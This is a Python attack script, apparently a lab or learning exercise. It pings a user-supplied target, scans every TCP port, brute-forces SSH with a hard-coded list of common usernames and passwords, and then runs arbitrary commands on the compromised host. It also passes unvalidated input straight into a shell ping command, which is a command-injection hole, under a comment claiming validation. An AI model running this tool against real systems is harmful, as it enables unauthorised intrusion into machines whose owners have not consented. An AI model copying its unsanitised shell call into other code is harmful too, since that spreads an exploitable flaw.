import os
import socket
import paramiko

# Define the target IP address
target_ip = input("please enter your target ip: ")

# Ping the target to check if it's up
response = os.system("ping -c 1 " + target_ip)
if response == 0:
    print(target_ip, "is up!")
else:
    print(target_ip, "is down!")
    exit()

# Scan all TCP ports
tcp_ports = []
for port in range(1, 65536):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.01)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        tcp_ports.append(port)
    sock.close()

print("Open TCP ports:", tcp_ports)

# Try to log in over SSH on port 22
ssh_port = 22
if ssh_port in tcp_ports:
    usernames = ["kali", "admin", "user"]
    passwords = ["password1", "password2", "kali"]
    for username in usernames:
        for password in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target_ip, port=ssh_port, username=username, password=password)
                print(f"A match was found: username = {username} password = {password}")
                print("\nWelcome", username)
                choice = input("Would you like to send commands? (y/n): ")
                while choice == "y":
                    # Execute a command on the remote server
                    commands = ['pwd', 'whoami', 'ifconfig', 'echo natali', 'touch file.txt', 'mkdir nataliD', 'ls']
                    for c in commands:
                        print(f"{c}")
                    command = input("Please enter command from the list: ")
                    # Validate the user input
                    stdin, stdout, stderr = ssh.exec_command(command)
                    output = stdout.read().decode()
                    print(output)
                    stdin.close()
                    choice = input("Would you like to send commands? (y/n): ")
                ssh.close()
                exit()
            except paramiko.AuthenticationException:
                print(f"No match was found! username = {username}  password = {password}")
                continue
else:
    print("Port 22 is closed.")